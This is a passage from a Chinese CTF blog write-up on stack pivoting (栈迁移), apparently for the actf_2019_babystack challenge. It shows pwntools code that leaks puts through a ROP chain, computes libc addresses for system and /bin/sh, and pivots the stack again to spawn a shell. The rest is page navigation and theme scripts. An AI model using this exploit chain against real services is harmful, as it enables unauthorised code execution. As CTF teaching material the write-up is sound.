+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaaaaaa&#x27;</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(s_addr) + p64(leave_ret) <span class="comment"># 跳转到s栈上</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;message?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------&gt;&quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>接收 puts 地址，进行 libc 的计算，找到 system 和 &#x2F;bin&#x2F;sh 的地址</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">libc_case = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_case + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_case + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>在栈上写入 system(‘&#x2F;bin&#x2F;sh’)再进行一次栈迁移，再次迁移回来就可以执行获取 shell</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">224</span>))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">s_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;aaaaaaaa&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)</span><br><span class="line">p = p.ljust(<span class="number">0xd0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p += p64(s_addr) + p64(leave_ret)</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/OjtIZ-5TIbD3ysuF/1773840591864-19ec3eb5-3e59-4828-b50f-5b32294b68b7-682192.png" alt="1773840591864-19ec3eb5-3e59-4828-b50f-5b32294b68b7.png"></p>
+<blockquote>
+<p>更新: 2026-03-18 21:50:02<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/onc5zyi4mkxs4vih">https://www.yuque.com/idcm/wnemg9/onc5zyi4mkxs4vih</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="axb_2019_fmt64(格式化单字节修改--_x00截断）" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/axb_2019_fmt64(%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%8D%95%E5%AD%97%E8%8A%82%E4%BF%AE%E6%94%B9--_x00%E6%88%AA%E6%96%AD%EF%BC%89/" aria-label="前一篇: axb_2019_fmt64(格式化单字节修改--_x00截断）" title="前一篇: axb_2019_fmt64(格式化单字节修改--_x00截断）"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            axb_2019_fmt64(格式化单字节修改--_x00截断）
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="[HDCTF2023]Makewish" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/PWN/PWNCTF/%E6%A0%88%E8%BF%81%E7%A7%BB/%5BHDCTF2023%5DMakewish/" aria-label="后一篇: [HDCTF2023]Makewish"  title="后一篇: [HDCTF2023]Makewish"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          [HDCTF2023]Makewish
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">栈迁移利用方法分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN"><span class="toc-number">1.1.</span> <span class="toc-text">1）[Black Watch 入群题]PWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89actf-2019-babystack-%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.2.</span> <span class="toc-text">2）actf_2019_babystack(栈迁移)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#signal-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">signal() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#putchar-62"><span class="toc-number">1.2.2.</span> <span class="toc-text">putchar(62)</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "栈迁移利用方法分析",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/",
+          excerpt: "",
+          description: "",
+          stripContent: "栈迁移利用方法分析参考资料：https://hetian.blog.csdn.net/article/details/106561835 1）[Black Watch 入群题]PWN 1234567891011121314ssize_t vul_function()&amp;#123;    size_t _Hello_good_Ctfer__nWhat_is_your_name?_; // eax    size_t _What_do_you_want_to_say?_; // eax    _BYT",
+          date: "Tue Apr 28 2026 18:25:58 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
